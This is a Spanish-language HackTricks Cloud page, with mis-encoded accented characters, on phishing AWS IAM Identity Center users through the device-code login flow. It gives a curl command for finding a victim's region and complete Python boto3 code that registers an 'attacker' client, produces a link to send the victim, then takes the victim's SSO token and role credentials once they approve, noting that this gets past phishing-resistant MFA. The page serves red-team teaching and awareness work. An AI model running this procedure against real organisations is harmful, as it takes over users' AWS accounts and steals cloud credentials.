# AWS - Enumeraci칩n no autenticada del Centro de Identidad y SSO

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Phishing de C칩digo de Dispositivo de AWS

Inicialmente propuesto en [**esta publicaci칩n de blog**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/), es posible enviar un **enlace** a un usuario utilizando AWS SSO que, si el **usuario acepta**, el atacante podr치 obtener un **token para suplantar al usuario** y acceder a todos los roles a los que el usuario puede acceder en el **Centro de Identidad**.

Para llevar a cabo este ataque, se necesitan los siguientes requisitos:

* La v칤ctima debe usar el **Centro de Identidad**
* El atacante debe conocer el **subdominio** utilizado por la v칤ctima `<subdominiovictima>.awsapps.com/start`

Solo con esta informaci칩n previa, el **atacante podr치 enviar un enlace al usuario** que, si es **aceptado**, otorgar치 al **atacante acceso a la cuenta de usuario de AWS**.

### Ataque

1. **Encontrar el subdominio**

El primer paso del atacante es descubrir el subdominio que la empresa v칤ctima est치 utilizando en su Centro de Identidad. Esto se puede hacer a trav칠s de **OSINT** o **adivinando + BF** ya que la mayor칤a de las empresas estar치n utilizando su nombre o una variaci칩n de su nombre aqu칤.

Con esta informaci칩n, es posible obtener la regi칩n donde se configur칩 el Centro de Identidad:
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **Generar el enlace para la v칤ctima y enviarlo**

Ejecuta el siguiente c칩digo para generar un enlace de inicio de sesi칩n de AWS SSO para que la v칤ctima pueda autenticarse.\
Para la demostraci칩n, ejecuta este c칩digo en una consola de Python y no la cierres, ya que m치s adelante necesitar치s algunos objetos para obtener el token:
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
3. **Espera hasta que la v칤ctima lo acepte**

Si la v칤ctima ya estaba **conectada en AWS**, solo necesitar치 aceptar otorgar los permisos, si no lo estaba, necesitar치 **iniciar sesi칩n y luego aceptar otorgar los permisos**.\
As칤 es como se ve el mensaje en la actualidad:

<figure><img src="../../../.gitbook/assets/image (154).png" alt="" width="311"><figcaption></figcaption></figure>

4. **Obtener el token de acceso SSO**

Si la v칤ctima acept칩 el mensaje, ejecuta este c칩digo para **generar un token SSO suplantando al usuario**:
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
El token de acceso SSO es **v치lido por 8 horas**.

5. **Suplantar al usuario**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### Suplantaci칩n de identidad en el MFA inquebrantable

Es interesante saber que el ataque anterior **funciona incluso si se est치 utilizando un "MFA inquebrantable" (webAuth)**. Esto se debe a que el **flujo de trabajo anterior nunca abandona el dominio OAuth utilizado**. A diferencia de otros ataques de phishing donde el usuario necesita suplantar el dominio de inicio de sesi칩n, en este caso el flujo de trabajo del c칩digo de dispositivo est치 preparado para que un **c칩digo sea conocido por un dispositivo** y el usuario pueda iniciar sesi칩n incluso en una m치quina diferente. Si se acepta la solicitud, el dispositivo, solo con **conocer el c칩digo inicial**, podr치 **recuperar las credenciales** del usuario.

Para obtener m치s informaci칩n sobre esto, [**consulte esta publicaci칩n**](https://mjg59.dreamwidth.org/62175.html).

### Herramientas autom치ticas

* [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
* [https://github.com/sebastian-mora/awsssome\_phish](https://github.com/sebastian-mora/awsssome\_phish)

## Referencias

* [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
* [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
* [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
* [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
